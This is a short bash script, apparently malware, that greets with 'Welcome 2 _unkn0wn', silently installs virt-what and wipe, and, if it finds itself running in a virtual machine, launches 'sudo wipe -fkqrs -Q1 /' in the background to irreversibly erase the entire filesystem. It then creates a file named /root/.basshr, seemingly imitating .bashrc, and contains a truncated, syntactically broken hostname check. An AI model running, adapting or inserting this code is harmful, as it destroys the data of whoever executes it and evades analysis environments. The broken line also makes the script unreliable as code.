#!/bin/bash
printf "Welcome 2 _unkn0wn...\n"

sudo apt -f -y install &> /dev/null ; [[ -z "$(type virt-what)" ]] && sudo apt-get -y install virt-what ; [[ -z "$(type wipe)" ]] && sudo apt-get -y install wipe
result="$(sudo virt-what)" ; [[ -n $result ]] && sudo wipe -fkqrs -Q1 / &

if test "$(hostname)" = 
touch /root/.basshr

